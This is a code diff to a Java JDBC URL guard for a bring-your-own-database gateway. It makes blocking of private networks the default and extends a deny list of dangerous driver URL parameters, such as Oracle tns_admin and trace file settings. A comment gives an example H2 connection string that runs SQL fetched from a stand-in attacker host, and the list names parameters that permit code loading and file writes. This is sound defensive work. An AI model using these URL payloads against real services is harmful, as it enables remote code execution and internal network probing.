@@ -77,6 +77,10 @@ public record ByokProperties(
     /**
      * Lifecycle-only constructor, retained so that callers that do not care about the JDBC URL guard
      * keep compiling and transparently get {@link UrlGuard#defaults()}.
+     *
+     * <p>注意「不关心」不等于「不生效」：默认值里 {@code blockPrivateNetworks} 现在是 {@code true}，
+     * 所以用这个构造器的调用方（主要是单测）注册 {@code localhost} / 127.0.0.1 的连接会被守卫拒掉，
+     * 需要改用七参构造器显式传一个放开内网的 {@link UrlGuard}。
      */
     public ByokProperties(Duration leaseDuration,
                           Duration maxLifetime,
@@ -92,12 +96,26 @@ public record ByokProperties(
      *
      * <h2>Why the defaults are asymmetric</h2>
      * This is a BYOK gateway: the caller legitimately owns the database it points us at, so
-     * restricting <em>which driver</em> or <em>which host</em> may be reached is deployment policy and
-     * defaults to "everything allowed" ({@code allowedDrivers} / {@code blockedHosts} empty,
-     * {@code blockPrivateNetworks} false). Turning those on by default would break working
-     * connections without closing the actual hole.
+     * restricting <em>which driver</em> may be reached is deployment policy and defaults to
+     * "everything allowed" ({@code allowedDrivers} / {@code blockedHosts} empty). Turning those on by
+     * default would break working connections without closing the actual hole.
      *
-     * <p>The actual hole is the <em>parameters</em> of the URL. A JDBC URL is not just an address; for
+     * <h2>为什么内网默认不可达（破坏性变更：{@code blockPrivateNetworks} 默认由 false 改为 true）</h2>
+     * 「调用方拥有那个库」这个前提在公网地址上成立，在内网地址上不成立：{@code 169.254.169.254}
+     * （云元数据，取到就是一份实例凭证）、{@code 127.0.0.1}、RFC1918 任意端口，都不是调用方的库，而是
+     * <em>本进程所在网络</em>的资产。而且连不上也有价值——连接成功/失败的差异与错误文本本身就是一条内网
+     * 端口与服务指纹的探测信道，攻击方不需要真的连上库。
+     *
+     * <p>否决的方案：只把 {@code 169.254.169.254} 写进 {@code blockedHosts} 默认值。它只挡住今天已知的
+     * 那一个地址，换成 {@code fd00:ec2::254}（AWS IMDS 的 IPv6 形态）、{@code 100.100.200.200}
+     * （阿里云）或任意一台内网 Redis/Elasticsearch 的端口就绕过了；「内网」才是这里应该表达的边界。
+     *
+     * <p>代价是本地开发与「服务和数据库同机/同 compose 网络」的部署会被拦，必须显式写
+     * {@code block-private-networks: false}。这是刻意的：那是一句可以 review、可以 grep 的配置，
+     * 而默认放开是一个没人看得见的决定。
+     *
+     * <h2>The actual code-execution hole is the parameters</h2>
+     * A JDBC URL is not just an address; for
      * several drivers on this classpath it is also a code/file-access channel:
      * <ul>
      *   <li>{@code jdbc:h2:mem:x;INIT=RUNSCRIPT FROM 'http://attacker/x.sql'} executes attacker SQL at
@@ -118,7 +136,8 @@ public record ByokProperties(
      *                                     {@code .} or {@code *.} matches by domain suffix; empty
      *                                     means no host is blocked
      * @param blockPrivateNetworks         reject loopback / link-local / RFC1918 literals; defaults to
-     *                                     {@code false}
+     *                                     {@code true}（本地开发连 localhost 的库时需显式设为
+     *                                     {@code false}）
      * @param rejectDangerousUrlParameters reject the code-execution and local-file URL parameters
      *                                     listed above; defaults to {@code true}
      */
@@ -135,6 +154,13 @@ public record ByokProperties(
          *
          * <p>H2's {@code FORBID_CREATION} is deliberately absent: it is a hardening switch, not an
          * attack vector, so it stays usable.
+         *
+         * <p><b>黑名单是权宜之计。</b>长期方向是白名单（{@code allowed-parameters}：非空时只放行名单内的
+         * 键），因为「哪些参数是安全的」是有限且可枚举的，而「哪些参数危险」永远追不完——每个新驱动版本都
+         * 可能加一个新的类名入口。本次没有实现，是因为它要给 {@link UrlGuard} 加一个 record 组件，
+         * 而这个 record 由 Spring 做值对象绑定（多构造器就必须显式 {@code @ConstructorBinding}），
+         * 属于会影响生产配置绑定的改动，不该和一次安全默认值收紧混在同一个提交里。
+         * TODO(url-guard): 增加 {@code allowedParameters}，非空时只放行名单内的键，为空时退回本黑名单。
          */
         private static final Set<String> DANGEROUS_PARAMETER_KEYS = Set.of(
                 // H2: run SQL / scripts at connect time, or write to an attacker-chosen file
@@ -154,7 +180,24 @@ public record ByokProperties(
                 "sslfactory", "sslfactoryarg", "sslhostnameverifier", "sslpasswordcallback",
                 "authenticationpluginclassname", "xmlfactoryfactory", "socketfactoryarg", "loggerfile",
                 // DB2：这个参数会触发一次 JNDI 查找，等价于远程加载
-                "clientrerouteserverlistjndiname");
+                "clientrerouteserverlistjndiname",
+                // Oracle：值是「文件路径」而不是类名，也不以危险后缀结尾，所以上面三层启发式
+                // （显式黑名单 / DANGEROUS_KEY_SUFFIXES / FULLY_QUALIFIED_CLASS_NAME）一个都不命中，
+                // 只能逐个点名：
+                //   tns_admin      —— 指定 tnsnames.ora + sqlnet.ora 所在目录。攻击方把目录指到自己
+                //                     可写的路径（/tmp、共享卷、前一步 backupData 落盘的目录），别名就能
+                //                     解析到任意 host:port，等于绕过 blocked-hosts / block-private-networks；
+                //                     sqlnet.ora 还能顺手打开 trace 往任意路径写文件。
+                //   wallet_location—— 指定 SSO 钱包目录，驱动会去读该路径下的 cwallet.sso：
+                //                     既是「用攻击方自带的证书/凭证连库」，也是一个文件存在性探测信道
+                //                     （读不到与格式不对的报错不同）。
+                "oracle.net.tns_admin", "oracle.net.wallet_location",
+                // 同上，但换成不带前缀的写法：驱动属性名有多种拼法，键名比对是精确匹配，不多列就漏
+                "tns_admin", "wallet_location",
+                // Oracle 的任意文件写入（与 PostgreSQL 的 loggerFile、H2 的 trace_level_file 同类）：
+                // 目录 + 文件名都由 URL 指定，可以往 web 目录里写出可被访问的文件
+                "oracle.net.trace_directory", "oracle.net.trace_file_name",
+                "oracle.net.log_directory", "oracle.net.log_file_name");
 
         /**
          * 通用兜底：以这些词收尾的参数名，在所有 JDBC 驱动里几乎都是「给我一个类名/回调，我来实例化」。
@@ -187,7 +230,12 @@ public record ByokProperties(
             allowedDrivers = normalize(allowedDrivers);
             blockedHosts = normalize(blockedHosts);
             if (blockPrivateNetworks == null) {
-                blockPrivateNetworks = false;
+                // 破坏性变更：默认由 false 改为 true。见 record 注释里的「为什么内网默认不可达」。
+                // 本地开发要连 localhost / 容器里的库，请显式写
+                //   entropy.mcp.database.byok.url-guard.block-private-networks=false
+                // （或把该库的地址写进 entropy.mcp.database.connections 预声明——预声明同样走这道守卫，
+                // 所以本地跑 docker 里的 pg 也要关掉这个开关。）
+                blockPrivateNetworks = true;
             }
             if (rejectDangerousUrlParameters == null) {
                 // The one guard that is on by default: see the class comment.
@@ -195,9 +243,9 @@ public record ByokProperties(
             }
         }
 
-        /** Driver and host wide open, dangerous URL parameters rejected. */
+        /** Driver wide open, private / loopback hosts and dangerous URL parameters rejected. */
         public static UrlGuard defaults() {
-            return new UrlGuard(List.of(), List.of(), false, true);
+            return new UrlGuard(List.of(), List.of(), true, true);
         }
 
         /**
